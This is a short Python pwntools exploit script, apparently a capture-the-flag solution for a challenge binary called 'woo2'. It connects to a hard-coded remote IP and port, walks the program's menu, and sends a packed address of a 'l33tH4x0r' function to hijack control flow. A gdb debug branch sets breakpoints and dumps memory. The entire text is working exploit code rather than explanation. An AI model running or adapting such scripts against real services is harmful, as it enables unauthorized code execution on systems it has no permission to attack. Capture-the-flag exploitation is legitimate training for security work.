from pwn import *

l33tH4x0r_addr = 0x40090E

debug = False

if not debug:
	with remote('104.155.227.252', 25050) as p:
		print p.recvuntil('choice:')
		p.sendline('2') # tiger
		print p.recvuntil('want:')
		p.sendline('3') # type
		print p.recvuntil('tiger:')
		p.sendline(p64(l33tH4x0r_addr))

		# pwnMe
		print p.recvuntil('choice:')
		p.sendline('4919')

		print p.recvall()
else:
	p = process(['gdb', '-q', '/home/nscd/tu_ctf/woo2'])
	print p.recvuntil('(gdb)')

	# print p.sendline('b *0x400CAA')
	print p.sendline('b *0x400CD9')
	print p.recvuntil('(gdb)')
	p.sendline('r')

	# make tiger
	print p.recvuntil('choice:')
	p.sendline('2') # tiger
	print p.recvuntil('want:')
	p.sendline('3') # type
	print p.recvuntil('tiger:')
	p.sendline(p64(l33tH4x0r_addr))

	# pwnMe
	print p.recvuntil('choice:')
	p.sendline('4919')

	print p.recvuntil('(gdb)')
	p.sendline('x/30x *0x6020e0')

	p.interactive()

	